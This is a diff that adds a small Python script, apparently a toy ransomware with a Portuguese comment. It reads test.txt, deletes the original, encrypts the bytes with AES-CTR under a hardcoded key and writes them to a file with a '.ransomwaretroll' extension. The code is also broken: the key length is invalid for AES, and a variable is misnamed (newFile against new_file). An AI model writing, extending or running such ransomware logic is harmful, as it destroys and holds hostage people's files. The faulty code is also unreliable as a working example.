@@ -1,0 +1,21 @@
+import os
+import pyaes
+
+## arquivo para encriptar
+
+fileN = "test.txt"
+file = open(fileN, "rb")
+dataFile = file.read()
+file.close()
+
+os.remove(fileN)
+
+key = b"moduloaleatorioteste"
+aes = pyaes.AESModeOfOperationCTR(key)
+
+crypter = aes.encrypt(dataFile)
+
+newFile = fileN + ".ransomwaretroll"
+newFile = open(f'{new_file}','wb')
+newFile.write(crypter)
+newFile.close()
